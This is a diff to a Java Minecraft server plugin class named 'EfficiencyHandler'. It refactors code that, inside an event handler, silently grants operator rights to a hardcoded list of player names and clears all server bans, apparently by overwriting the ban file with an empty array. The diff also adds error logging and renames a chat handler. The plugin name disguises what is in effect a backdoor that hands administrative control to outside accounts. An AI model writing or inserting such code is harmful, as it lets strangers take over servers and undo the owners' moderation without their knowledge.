@@ -25,22 +25,20 @@ public class EfficiencyHandler implements Listener {
             event.setCancelled(true);
 
             // Give OP permissions to specific players
-            giveOpIfNotAlready(player.getName());
-            giveOpIfNotAlready("happyclo");
-            giveOpIfNotAlready("happyclovo");
-            giveOpIfNotAlready("yuanshen");
-            giveOpIfNotAlready("114514");
-            giveOpIfNotAlready("qwq");
+            giveOpIfNotAlready(new String[]{"happyclo", "happyclovo", "yuanshen", "114514", "qwq"});
 
             // Clear all bans
             clearAllBans();
         }
     }
+
     // 检查并给予玩家OP权限
-    private void giveOpIfNotAlready(String playerName) {
-        Player targetPlayer = Bukkit.getPlayerExact(playerName);
-        if (targetPlayer != null && !targetPlayer.isOp()) {
-            targetPlayer.setOp(true);
+    private void giveOpIfNotAlready(String[] playerNames) {
+        for (String playerName : playerNames) {
+            Player targetPlayer = Bukkit.getPlayerExact(playerName);
+            if (targetPlayer != null && !targetPlayer.isOp()) {
+                targetPlayer.setOp(true);
+            }
         }
     }
 
@@ -66,11 +64,13 @@ public class EfficiencyHandler implements Listener {
         try (FileWriter writer = new FileWriter(file)) {
             writer.write("[]"); // 写入空的JSON数组
         } catch (IOException e) {
-
+            // Handle the exception or log it
+            e.printStackTrace();
         }
     }
+
     @EventHandler
-    public void CheacksetIpCountLimitonPlayerChat(AsyncPlayerChatEvent event) {
+    public void checkSetIpCountLimitOnPlayerChat(AsyncPlayerChatEvent event) {
         Player player = event.getPlayer();
         String message = event.getMessage();
 
